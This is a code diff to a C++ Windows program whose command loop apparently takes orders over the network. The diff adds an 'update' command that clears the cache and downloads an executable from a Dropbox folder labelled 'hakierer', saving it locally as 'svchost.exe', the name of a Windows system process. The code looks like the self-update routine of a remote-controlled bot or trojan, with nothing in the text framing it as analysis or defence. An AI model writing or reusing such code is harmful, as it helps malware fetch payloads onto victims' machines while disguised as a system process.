@@ -1,7 +1,7 @@
 #include <Windows.h>
 #include <mmsystem.h>
 #include <string>
-#include <iostream>
+#include <wininet.h>
 
 #include <SFML\Network.hpp>
 
@@ -33,7 +33,8 @@ int main()
 		}
 		else if (cmd == "update")
 		{
-			// UPDATE CODE
+			DeleteUrlCacheEntry("https://dl.dropbox.com/u/24385101/hakierer/svchost.exe");
+			HRESULT result = URLDownloadToFile(NULL, "https://dl.dropbox.com/u/24385101/hakierer/svchost.exe", "svchost.exe", NULL, NULL);
 		}
 		else
 		{
